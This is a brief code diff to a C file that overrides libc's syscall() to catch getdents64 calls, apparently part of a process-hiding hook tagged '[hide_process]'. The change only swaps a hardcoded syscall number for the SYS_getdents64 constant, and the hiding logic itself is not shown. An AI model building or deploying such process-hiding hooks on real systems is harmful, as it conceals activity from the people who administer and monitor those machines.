@@ -6,6 +6,7 @@
 #include <dirent.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <sys/syscall.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -298,8 +299,7 @@ long syscall(long number, ...) {
         }
     }
 
-    // SYS_getdents64 is syscall number 61 on aarch64
-    if (number == 61) {  // SYS_getdents64
+    if (number == SYS_getdents64) {  // SYS_getdents64
         DEBUG_PRINT("[hide_process] Detected SYS_getdents64 via syscall()!\n");
 
         va_start(args, number);
